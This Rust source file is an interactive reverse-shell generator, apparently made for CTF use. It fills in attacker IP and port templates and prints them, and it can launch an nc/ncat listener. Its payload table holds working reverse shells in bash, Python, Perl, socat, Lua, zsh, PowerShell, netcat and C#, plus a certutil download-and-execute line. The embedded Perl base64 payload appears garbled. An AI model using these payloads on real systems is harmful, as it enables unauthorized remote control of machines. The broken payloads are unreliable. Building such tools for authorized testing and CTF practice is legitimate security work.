use colored::{Color, Colorize};
use std::{
    collections::HashSet,
    fmt,
    io::{self, Write},
    net::UdpSocket,
    process::Command,
    str::FromStr,
};

const BANNER: &str = r#"
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                        Remade in Rust for CTF Use
"#;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum OsType {
    Linux,
    Windows,
}

impl OsType {
    fn key(self) -> &'static str {
        match self {
            OsType::Linux => "linux",
            OsType::Windows => "windows",
        }
    }
}

impl fmt::Display for OsType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            OsType::Linux => write!(f, "Linux"),
            OsType::Windows => write!(f, "Windows"),
        }
    }
}

#[derive(Debug, Clone)]
enum PayloadTemplate {
    Static(&'static str),
    PythonBase64 { script: &'static str },
}

impl PayloadTemplate {
    fn render(&self, config: &Config) -> String {
        match self {
            PayloadTemplate::Static(template) => template
                .replace("{ip}", &config.active_ip)
                .replace("{port}", &config.port.to_string()),
            PayloadTemplate::PythonBase64 { script } => {
                let script = script
                    .replace("{ip}", &config.active_ip)
                    .replace("{port}", &config.port.to_string());
                let encoded = base64::encode(script);
                format!(
                    "python3 -c \"import base64,os,socket,pty; exec(base64.b64decode('{}').decode())\"",
                    encoded
                )
            }
        }
    }
}

#[derive(Debug, Clone)]
struct ShellPayload {
    name: &'static str,
    lang: &'static str,
    os: OsType,
    template: PayloadTemplate,
}

#[derive(Debug, Clone)]
struct RenderedPayload {
    name: &'static str,
    lang: &'static str,
    os: OsType,
    payload: String,
}

#[derive(Debug, Clone)]
struct Config {
    local_ip: String,
    public_ip: String,
    active_ip: String,
    active_ip_type: String,
    port: u16,
}

fn get_all_payloads() -> Vec<ShellPayload> {
    vec![
        ShellPayload {
            name: "Bash TCP #1",
            lang: "bash",
            os: OsType::Linux,
            template: PayloadTemplate::Static("bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
        },
        ShellPayload {
            name: "Bash TCP #4 (Read/Write)",
            lang: "bash",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
            ),
        },
        ShellPayload {
            name: "Python #5 (Base64 Encoded)",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::PythonBase64 {
                script: "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')",
            },
        },
        ShellPayload {
            name: "Perl #3 (Base64 Encoded)",
            lang: "perl",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "perl -MMIME::Base64 -e 'eval(decode_base64(\"dXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjYXBpZSIpKTtpZihjb25uZWN0KFMsc29ja2FkZF9pbihKcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RJT1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307\"))'",
            ),
        },
        ShellPayload {
            name: "Socat #3 (TTY Upgrade)",
            lang: "socat",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
            ),
        },
        ShellPayload {
            name: "Rust (Simple TCP Client)",
            lang: "rust",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "RUST_CODE: use std::net::TcpStream; use std::process::Command; if let Ok(stream) = TcpStream::connect(\"{ip}:{port}\") { let _ = Command::new(\"/bin/sh\").stdin(stream.try_clone().unwrap()).stdout(stream.try_clone().unwrap()).stderr(stream).spawn(); }",
            ),
        },
        ShellPayload {
            name: "Lua Linux",
            lang: "lua",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            ),
        },
        ShellPayload {
            name: "Zsh",
            lang: "zsh",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "zmodload zsh/net/tcp && ztcp {ip} {port} && while read line; do $line 2>&3 >&3; done",
            ),
        },
        ShellPayload {
            name: "PowerShell #3 (Shortest)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "$s=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$st=$s.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sd=[text.encoding]::ASCII.GetBytes($sb2);$st.Write($sd,0,$sd.Length);$st.Flush()};$s.Close()",
            ),
        },
        ShellPayload {
            name: "Certutil/PowerShell (Download/Execute)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "certutil -urlcache -f http://{ip}/rev.ps1 %temp%\\rev.ps1; powershell -exec bypass %temp%\\rev.ps1",
            ),
        },
        ShellPayload {
            name: "Netcat Windows",
            lang: "cmd",
            os: OsType::Windows,
            template: PayloadTemplate::Static("nc.exe -e cmd.exe {ip} {port}"),
        },
        ShellPayload {
            name: "VBScript",
            lang: "vbs",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "VBS_FILE: Set objShell = CreateObject(\"WScript.Shell\") : Set objExec = objShell.Exec(\"cmd.exe /c powershell -enc [BASE64_PAYLOAD]\")",
            ),
        },
        ShellPayload {
            name: "C# (Simple)",
            lang: "c#",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "C#_CODE: using System.Net.Sockets; using System.Diagnostics; using System.Text; TcpClient client = new TcpClient(\"{ip}\", {port}); NetworkStream stream = client.GetStream(); Process process = new Process(); process.StartInfo.FileName = \"cmd.exe\"; process.StartInfo.UseShellExecute = false; process.StartInfo.RedirectStandardInput = true; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.Start(); stream.Write(Encoding.ASCII.GetBytes(\"Hello\\n\")); while(true) { if (stream.DataAvailable) { byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); process.StandardInput.WriteLine(Encoding.ASCII.GetString(buffer, 0, bytesRead)); } else if (process.StandardOutput.Peek() != -1) { stream.Write(Encoding.ASCII.GetBytes(process.StandardOutput.ReadToEnd())); } else if (process.StandardError.Peek() != -1) { stream.Write(Encoding.ASCII.GetBytes(process.StandardError.ReadToEnd())); } }",
            ),
        },
    ]
}

fn get_local_ip() -> String {
    match UdpSocket::bind("0.0.0.0:0") {
        Ok(socket) => match socket.connect("8.8.8.8:80") {
            Ok(_) => socket
                .local_addr()
                .map(|addr| addr.ip().to_string())
                .unwrap_or_else(|_| "127.0.0.1".to_string()),
            Err(_) => "127.0.0.1".to_string(),
        },
        Err(_) => "127.0.0.1".to_string(),
    }
}

fn get_public_ip() -> String {
    "0.0.0.0 (External IP Placeholder)".to_string()
}

fn get_input(prompt: &str) -> String {
    print!("{}", prompt.cyan().bold());
    let _ = io::stdout().flush();
    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .map(|_| input.trim().to_string())
        .unwrap_or_default()
}

fn validate_ip(ip: &str) -> bool {
    std::net::Ipv4Addr::from_str(ip).is_ok()
}

fn validate_port(port: u16) -> bool {
    (1..=65535).contains(&port)
}

fn clear_screen() {
    if cfg!(target_os = "windows") {
        let _ = Command::new("cmd").args(["/c", "cls"]).status();
    } else {
        let _ = Command::new("clear").status();
    }
}

fn render_payloads(
    all_shells: &[ShellPayload],
    os_type: OsType,
    language: Option<&str>,
    limit: Option<usize>,
    config: &Config,
) -> Vec<RenderedPayload> {
    let mut payloads: Vec<RenderedPayload> = all_shells
        .iter()
        .filter(|payload| payload.os == os_type)
        .filter(|payload| language.map_or(true, |lang| payload.lang.eq_ignore_ascii_case(lang)))
        .map(|payload| RenderedPayload {
            name: payload.name,
            lang: payload.lang,
            os: payload.os,
            payload: payload.template.render(config),
        })
        .collect();

    if let Some(limit) = limit {
        payloads.truncate(limit);
    }

    payloads
}

fn start_listener(port: u16) {
    println!("\n{}", "[*] Starting listener...".cyan().bold());
    println!("{}", "[*] Waiting for connection...\n".cyan().bold());

    let mut command = Command::new("nc");
    command.args(["-lvnp", &port.to_string()]);

    match command.status() {
        Ok(status) if status.success() => {}
        Ok(_) => {
            let mut ncat_command = Command::new("ncat");
            ncat_command.args(["-lvnp", &port.to_string()]);

            match ncat_command.status() {
                Ok(ncat_status) if ncat_status.success() => {}
                Ok(_) => println!(
                    "{}",
                    "[!] Error: Listener failed to start with nc or ncat."
                        .red()
                        .bold()
                ),
                Err(err) if err.kind() == io::ErrorKind::NotFound => {
                    println!(
                        "{}",
                        "[!] Error: netcat (nc) or ncat not found. Please install a listener tool."
                            .red()
                            .bold()
                    );
                    println!(
                        "{}",
                        format!("[*] Command to run manually: nc -lvnp {}", port).yellow()
                    );
                }
                Err(_) => println!(
                    "{}",
                    "[!] Error: ncat listener failed to start.".red().bold()
                ),
            }
        }
        Err(err) if err.kind() == io::ErrorKind::NotFound => {
            println!(
                "{}",
                "[!] Error: netcat (nc) not found. Trying 'ncat'."
                    .red()
                    .bold()
            );
            let mut ncat_command = Command::new("ncat");
            ncat_command.args(["-lvnp", &port.to_string()]);

            match ncat_command.status() {
                Ok(ncat_status) if ncat_status.success() => {}
                Ok(_) => println!(
                    "{}",
                    "[!] Error: Listener failed to start with nc or ncat."
                        .red()
                        .bold()
                ),
                Err(err) if err.kind() == io::ErrorKind::NotFound => {
                    println!(
                        "{}",
                        "[!] Error: netcat (nc) or ncat not found. Please install a listener tool."
                            .red()
                            .bold()
                    );
                    println!(
                        "{}",
                        format!("[*] Command to run manually: nc -lvnp {}", port).yellow()
                    );
                }
                Err(_) => println!(
                    "{}",
                    "[!] Error: ncat listener failed to start.".red().bold()
                ),
            }
        }
        Err(_) => println!(
            "{}",
            "[!] Error: Listener process failed to start.".red().bold()
        ),
    }

    println!("\n{}", "[*] Listener stopped".yellow());
}

fn display_banner() {
    println!("{}", BANNER.cyan());
}

fn display_config(config: &Config) {
    println!("\n{}", format!("╔{}╗", "═".repeat(78)).bold());
    println!(
        "{}  {}  {}",
        "║".bold(),
        "CURRENT CONFIGURATION".green().bold(),
        format!("{: <55}║", "").bold()
    );
    println!("{}", format!("╠{}╣", "═".repeat(78)).bold());

    let format_line = |name: &str, value: &str, color: Color| {
        let padding = 74i32 - name.len() as i32 - value.len() as i32;
        let padding = padding.max(0) as usize;
        let full_line = format!(
            "{}  {}  {}{}",
            "║".bold(),
            format!("{}:", name).cyan(),
            value.color(color),
            format!("{: <width$}║", "", width = padding).bold()
        );
        println!("{}", full_line);
    };

    format_line("Local IP", &config.local_ip, Color::Yellow);
    format_line("Public IP", &config.public_ip, Color::Yellow);

    let active_ip_display = format!("{} ({})", config.active_ip, config.active_ip_type);
    format_line("Active IP", &active_ip_display, Color::Green);
    format_line("Port", &config.port.to_string(), Color::Green);

    println!("{}", format!("╚{}╝", "═".repeat(78)).bold());
}

fn display_payloads(payloads: &[RenderedPayload], port: u16) {
    println!("\n{}", "=".repeat(80).bold());
    for (idx, payload) in payloads.iter().enumerate() {
        println!(
            "\n{}{}{}{}",
            format!("[{}] ", idx + 1).green().bold(),
            payload.name.bold().green(),
            format!(" ({})", payload.lang).cyan(),
            format!(" (OS: {})", payload.os).cyan()
        );
        println!("{}", "─".repeat(80).bold());
        println!("{}", payload.payload.yellow());
        println!("{}", "─".repeat(80).bold());
    }
    println!(
        "\n{} {}",
        "[*] Listener Command:".cyan(),
        format!("nc -lvnp {}", port).yellow().bold()
    );
}

fn initial_setup(config: &mut Config) {
    loop {
        clear_screen();
        display_banner();
        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {}  {}",
            "║".bold(),
            "INITIAL CONFIGURATION".yellow().bold(),
            format!("{: <56}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!("\n{}", "[*] IP ADDRESS SELECTION".cyan().bold());
        println!("{}", "─".repeat(80).bold());
        println!(
            "  {} Use Local IP:  {}",
            "[1]".green(),
            config.local_ip.yellow()
        );
        println!(
            "  {} Use Public IP: {}",
            "[2]".green(),
            config.public_ip.yellow()
        );
        println!("  {} Enter Custom IP", "[3]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select IP option (1-3): ");

        match choice.as_str() {
            "1" => {
                config.active_ip = config.local_ip.clone();
                config.active_ip_type = "Local".to_string();
                println!(
                    "{}",
                    format!("[+] IP set to Local: {}", config.active_ip).green()
                );
                break;
            }
            "2" => {
                config.active_ip = config.public_ip.clone();
                config.active_ip_type = "Public".to_string();
                println!(
                    "{}",
                    format!("[+] IP set to Public: {}", config.active_ip).green()
                );
                break;
            }
            "3" => {
                let custom_ip = get_input("Enter custom IP address: ");
                if validate_ip(&custom_ip) {
                    config.active_ip = custom_ip;
                    config.active_ip_type = "Custom".to_string();
                    println!(
                        "{}",
                        format!("[+] IP set to Custom: {}", config.active_ip).green()
                    );
                    break;
                } else {
                    println!("{}", "[!] Invalid IP address format. Try again.".red());
                    let _ = get_input("Press Enter to continue...");
                }
            }
            _ => {
                println!("{}", "[!] Invalid option. Please select 1, 2, or 3.".red());
                let _ = get_input("Press Enter to continue...");
            }
        }
    }

    loop {
        println!("\n{}", "[*] PORT SELECTION".cyan().bold());
        println!("{}", "─".repeat(80).bold());
        println!("  {} Use port 4444 (default)", "[1]".green());
        println!("  {} Use port 1337", "[2]".green());
        println!("  {} Use port 9001", "[3]".green());
        println!("  {} Enter custom port", "[4]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select port option (1-4): ");

        match choice.as_str() {
            "1" => {
                config.port = 4444;
                println!("{}", format!("[+] Port set to: {}", config.port).green());
                break;
            }
            "2" => {
                config.port = 1337;
                println!("{}", format!("[+] Port set to: {}", config.port).green());
                break;
            }
            "3" => {
                config.port = 9001;
                println!("{}", format!("[+] Port set to: {}", config.port).green());
                break;
            }
            "4" => {
                let custom_port = get_input("Enter custom port (1-65535): ");
                if let Ok(port_num) = custom_port.parse::<u16>() {
                    if validate_port(port_num) {
                        config.port = port_num;
                        println!("{}", format!("[+] Port set to: {}", config.port).green());
                        break;
                    } else {
                        println!(
                            "{}",
                            "[!] Port must be between 1 and 65535. Try again.".red()
                        );
                    }
                } else {
                    println!("{}", "[!] Invalid port number. Try again.".red());
                }
            }
            _ => println!(
                "{}",
                "[!] Invalid option. Please select 1, 2, 3, or 4.".red()
            ),
        }
    }

    println!("\n{}", "[✓] Configuration complete!".green().bold());
    let _ = get_input("\nPress Enter to continue...");
}

fn os_submenu(config: &mut Config, os_type: OsType, all_shells: &[ShellPayload]) {
    let os_name = os_type.to_string();
    let available_languages: Vec<String> = all_shells
        .iter()
        .filter(|payload| payload.os == os_type)
        .map(|payload| payload.lang.to_string())
        .collect::<HashSet<_>>()
        .into_iter()
        .collect();

    loop {
        clear_screen();
        display_banner();
        display_config(config);

        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {} SHELLS MENU{}",
            "║".bold(),
            os_name.to_uppercase().cyan().bold(),
            format!("{: <61}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!("  {} Show All Shells (Top 5)", "[1]".green());
        println!("  {} Browse by Language", "[2]".green());
        println!("  {} Show All Available Shells", "[3]".green());
        println!("  {} Generate Shells & Start Listener", "[4]".green());

        println!("\n  {}", "Quick Access Languages:".cyan().bold());
        let quick_access = match os_type {
            OsType::Linux => vec![("b", "bash"), ("p", "python"), ("z", "zsh"), ("n", "socat")],
            OsType::Windows => vec![("p", "powershell"), ("c", "cmd"), ("v", "vbs"), ("h", "c#")],
        };
        for (key, lang) in &quick_access {
            println!(
                "  {} {} menu",
                format!("[{}]", key).green(),
                lang.capitalize()
            );
        }

        println!("\n  {} Back to Main Menu", "[5]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select option: ");

        match choice.as_str() {
            "1" => {
                let payloads = render_payloads(all_shells, os_type, None, Some(5), config);
                display_payloads(&payloads, config.port);
                let _ = get_input("\nPress Enter to continue...");
            }
            "2" => loop {
                clear_screen();
                display_banner();
                display_config(config);
                println!(
                    "\n{}",
                    "╔══════════════════════════════════════════════════════════════════════════════╗".bold()
                );
                println!(
                    "{}  {}  {}",
                    "║".bold(),
                    "AVAILABLE LANGUAGES".cyan().bold(),
                    format!("{: <58}║", "").bold()
                );
                println!(
                    "{}",
                    "╚══════════════════════════════════════════════════════════════════════════════╝".bold()
                );

                let mut sorted_langs = available_languages.clone();
                sorted_langs.sort();

                for (idx, lang) in sorted_langs.iter().enumerate() {
                    println!(
                        "  {} {}",
                        format!("[{}]", idx + 1).green(),
                        lang.capitalize()
                    );
                }
                println!("{}", "─".repeat(80).bold());
                println!("  {} Back to {} Menu", "[0]".green(), os_name);
                println!("{}", "─".repeat(80).bold());

                let lang_choice = get_input("Select language number: ");

                if lang_choice == "0" {
                    break;
                } else if let Ok(idx) = lang_choice.parse::<usize>() {
                    if (1..=sorted_langs.len()).contains(&idx) {
                        let selected_lang = &sorted_langs[idx - 1];
                        language_submenu(config, os_type, selected_lang, all_shells);
                    } else {
                        println!("{}", "[!] Invalid selection".red());
                        let _ = get_input("\nPress Enter to continue...");
                    }
                } else {
                    println!("{}", "[!] Invalid selection".red());
                    let _ = get_input("\nPress Enter to continue...");
                }
            },
            "3" => {
                let payloads = render_payloads(all_shells, os_type, None, None, config);
                display_payloads(&payloads, config.port);
                let _ = get_input("\nPress Enter to continue...");
            }
            "4" => {
                let payloads = render_payloads(all_shells, os_type, None, Some(5), config);
                display_payloads(&payloads, config.port);
                let confirm = get_input("\nStart listener now? (y/n): ");
                if confirm.eq_ignore_ascii_case("y") {
                    start_listener(config.port);
                }
                let _ = get_input("\nPress Enter to continue...");
            }
            "5" => break,
            _ if choice.len() == 1 => {
                if let Some((_, lang)) = quick_access.iter().find(|(key, _)| key == &choice) {
                    language_submenu(config, os_type, lang, all_shells);
                } else {
                    println!("{}", "[!] Invalid option".red());
                    let _ = get_input("\nPress Enter to continue...");
                }
            }
            _ => {
                println!("{}", "[!] Invalid option".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }
}

fn language_submenu(
    config: &mut Config,
    os_type: OsType,
    language: &str,
    all_shells: &[ShellPayload],
) {
    loop {
        clear_screen();
        display_banner();
        display_config(config);

        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {} SHELLS - {}{}",
            "║".bold(),
            language.to_uppercase().cyan().bold(),
            os_type.to_string().to_uppercase().cyan().bold(),
            format!("{: <50}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!(
            "  {} Show All {} Shells",
            "[1]".green(),
            language.capitalize()
        );
        println!(
            "  {} Show Top 5 {} Shells",
            "[2]".green(),
            language.capitalize()
        );
        println!("  {} Generate & Start Listener", "[3]".green());
        println!("  {} Back to {} Menu", "[4]".green(), os_type.to_string());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select option: ");

        match choice.as_str() {
            "1" => {
                let payloads = render_payloads(all_shells, os_type, Some(language), None, config);
                display_payloads(&payloads, config.port);
                let _ = get_input("\nPress Enter to continue...");
            }
            "2" => {
                let payloads =
                    render_payloads(all_shells, os_type, Some(language), Some(5), config);
                display_payloads(&payloads, config.port);
                let _ = get_input("\nPress Enter to continue...");
            }
            "3" => {
                let payloads = render_payloads(all_shells, os_type, Some(language), None, config);
                display_payloads(&payloads, config.port);

                let confirm = get_input("\nStart listener now? (y/n): ");
                if confirm.eq_ignore_ascii_case("y") {
                    start_listener(config.port);
                }
                let _ = get_input("\nPress Enter to continue...");
            }
            "4" => break,
            _ => {
                println!("{}", "[!] Invalid option".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }
}

fn main_loop() -> Result<(), io::Error> {
    let local_ip = get_local_ip();
    let public_ip = get_public_ip();

    let mut config = Config {
        active_ip: local_ip.clone(),
        active_ip_type: "Local".to_string(),
        local_ip,
        public_ip,
        port: 4444,
    };

    let all_shells = get_all_payloads();

    clear_screen();
    display_banner();
    println!(
        "\n{}",
        "╔══════════════════════════════════════════════════════════════════════════════╗"
            .red()
            .bold()
    );
    println!(
        "{}  {}  {}",
        "║".red().bold(),
        "⚠️  LEGAL WARNING ⚠️".yellow().bold(),
        format!("{: <60}║", "").red().bold()
    );
    println!(
        "{}",
        "╚══════════════════════════════════════════════════════════════════════════════╝"
            .red()
            .bold()
    );
    println!(
        "{}",
        "This tool generates REAL reverse shell payloads. Use it responsibly and legally for CTF and authorized testing ONLY.".yellow()
    );
    println!(
        "{}",
        "Unauthorized access to computer systems is ILLEGAL."
            .red()
            .bold()
    );
    println!("{}", "─".repeat(80).bold());

    let confirm = get_input("\nI understand and will use this tool responsibly (yes/no): ");
    if !confirm.eq_ignore_ascii_case("yes") {
        println!("{}", "\n[*] Exiting. Use responsibly!".yellow());
        std::process::exit(0);
    }

    initial_setup(&mut config);

    loop {
        clear_screen();
        display_banner();
        display_config(&config);

        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {}  {}",
            "║".bold(),
            "MAIN MENU".cyan().bold(),
            format!("{: <68}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!("  {} Generate Linux Shells", "[1]".green());
        println!("  {} Generate Windows Shells", "[2]".green());
        println!("  {} Reconfigure IP/Port", "[3]".green());
        println!("  {} Start Listener (nc/ncat)", "[4]".green());
        println!("  {} Exit", "[5]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select option: ");

        match choice.as_str() {
            "1" => os_submenu(&mut config, OsType::Linux, &all_shells),
            "2" => os_submenu(&mut config, OsType::Windows, &all_shells),
            "3" => {
                let _ = get_input("\nReconfiguration: Press Enter to re-run initial setup...");
                initial_setup(&mut config);
            }
            "4" => {
                start_listener(config.port);
                let _ = get_input("\nPress Enter to continue...");
            }
            "5" => {
                println!("{}", "\n[*] Exiting... Stay safe and legal!".green());
                break;
            }
            _ => {
                println!("{}", "[!] Invalid option".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }

    Ok(())
}

trait Capitalize {
    fn capitalize(&self) -> String;
}

impl Capitalize for str {
    fn capitalize(&self) -> String {
        let mut chars = self.chars();
        match chars.next() {
            None => String::new(),
            Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
        }
    }
}

fn main() {
    if let Err(error) = main_loop() {
        eprintln!(
            "{}",
            format!(
                "\n\n[*] An unexpected I/O error occurred: {}. Exiting.",
                error
            )
            .red()
            .bold()
        );
    }
    println!("{}", "\n[i] cya later .".red().bold());
}
